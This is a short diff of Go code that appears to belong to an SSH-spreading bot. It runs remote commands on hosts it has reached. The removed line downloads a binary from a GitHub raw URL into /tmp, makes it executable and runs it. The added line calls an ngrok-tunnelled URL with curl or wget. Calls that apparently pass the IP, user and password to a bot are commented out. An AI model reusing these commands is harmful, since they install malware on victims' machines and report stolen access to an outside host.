@@ -107,12 +107,12 @@ func fun(ip string) {
 			}
 
 
-er := session.Run("curl -L  https://github.com/atilabyte/golang/raw/refs/heads/master/atila -o /tmp/atila ; chmod 777 /tmp/atila ; /tmp/./atila  & ")
+er := session.Run("curl   https://knapsack-trickster-dance.ngrok-free.dev/teste  || wget  https://knapsack-trickster-dance.ngrok-free.dev/teste")
 
 
                  
 
-              go bot( ip ) ; go  bot (senha) ;  go bot (user)
+            //  go bot( ip ) ; go  bot (senha) ;  go bot (user)
 
 
 
